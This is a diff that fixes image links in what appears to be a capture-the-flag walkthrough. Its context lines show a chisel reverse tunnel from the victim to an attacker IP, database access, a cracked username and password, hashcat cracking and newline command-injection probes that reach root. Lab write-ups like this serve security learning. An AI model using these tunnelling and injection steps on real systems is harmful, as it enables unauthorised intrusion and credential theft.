@@ -795,7 +795,7 @@ Exploit()
 
 ## Getting a Shell
 
-![/assets/images/Pasted%20image%2020250131020128.png]
+![](/assets/images/Pasted%20image%2020250131020128.png)
 
 Once we got the shell, we already know what to do. Let's perform some port forwarding to gain access to the MySQL database and retrieve user credentials.
 
@@ -815,7 +815,7 @@ In the victim server:
 ./chisel client 10.10.14.91:5678 R:3306:172.17.0.1:3306
 ```
 
-![/assets/images/Pasted%20image%2020250131020833.png]
+![](/assets/images/Pasted%20image%2020250131020833.png)
 
 Now we can access the MySQL database from our local machine:
 
@@ -823,7 +823,7 @@ Now we can access the MySQL database from our local machine:
 mysql -D 'wordpress' -u 'wp_user' -h 172.17.0.1 --skip-ssl -p
 ```
 
-![/assets/images/Pasted%20image%2020250131021020.png]
+![](/assets/images/Pasted%20image%2020250131021020.png)
 
 ---
 
@@ -841,7 +841,7 @@ The hash is cracked:
 shawking:quantumphysics
 ```
 
-![/assets/images/Pasted%20image%2020250131031749.png]
+![](/assets/images/Pasted%20image%2020250131031749.png)
 
 We got the user flag!
 
@@ -851,9 +851,9 @@ We got the user flag!
 
 Next, let's run **LinPEAS** to check for further vulnerabilities. We found a **Grafana DB** with some hashes.
 
-![/assets/images/Pasted%20image%2020250131023937.png]
+![](/assets/images/Pasted%20image%2020250131023937.png)
 
-![/assets/images/Pasted%20image%2020250131024852.png]
+![](/assets/images/Pasted%20image%2020250131024852.png)
 
 ---
 
@@ -865,7 +865,7 @@ We found another hash to crack:
 hashcat -m 10900 developer-hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![/assets/images/Pasted%20image%2020250131025319.png]
+![](/assets/images/Pasted%20image%2020250131025319.png)
 
 ---
 
@@ -877,7 +877,7 @@ Let's check what services are running on the victim machine:
 netstat -tulpn
 ```
 
-![/assets/images/Pasted%20image%2020250131025710.png]
+![](/assets/images/Pasted%20image%2020250131025710.png)
 
 ---
 
@@ -885,11 +885,11 @@ netstat -tulpn
 
 We managed to obtain an APK file.
 
-![/assets/images/Pasted%20image%2020250131025653.png]
+![](/assets/images/Pasted%20image%2020250131025653.png)
 
 Opening it in **JADX-GUI**, we found a couple of interesting endpoints:
 
-![/assets/images/Pasted%20image%2020250131025810.png]
+![](/assets/images/Pasted%20image%2020250131025810.png)
 
     http://127.0.0.1:9090/login
     http://127.0.0.1:9090/command
@@ -930,11 +930,11 @@ We need to retrieve the authorization token and send the data to the `/command` 
 
 ### Retrieving the Token
 
-![/assets/images/Pasted%20image%2020250131030329.png]
+![](/assets/images/Pasted%20image%2020250131030329.png)
 
 We retrieve the token as follows:
 
-![/assets/images/Pasted%20image%2020250131030625.png]
+![](/assets/images/Pasted%20image%2020250131030625.png)
 
 ### Testing the Vulnerability
 
@@ -942,11 +942,11 @@ Testing the vulnerability with the following payloads:
 
 - When I tried `";"`:
 
-![/assets/images/Pasted%20image%2020250131031359.png]
+![](/assets/images/Pasted%20image%2020250131031359.png)
 
 - When I tried `"\n"`, it worked:
 
-![/assets/images/Pasted%20image%2020250131031305.png]
+![](/assets/images/Pasted%20image%2020250131031305.png)
 
 ---
 
@@ -954,7 +954,7 @@ Testing the vulnerability with the following payloads:
 
 It's time to get root!
 
-![/assets/images/Pasted%20image%2020250131031616.png]
+![](/assets/images/Pasted%20image%2020250131031616.png)
 
 ---
 
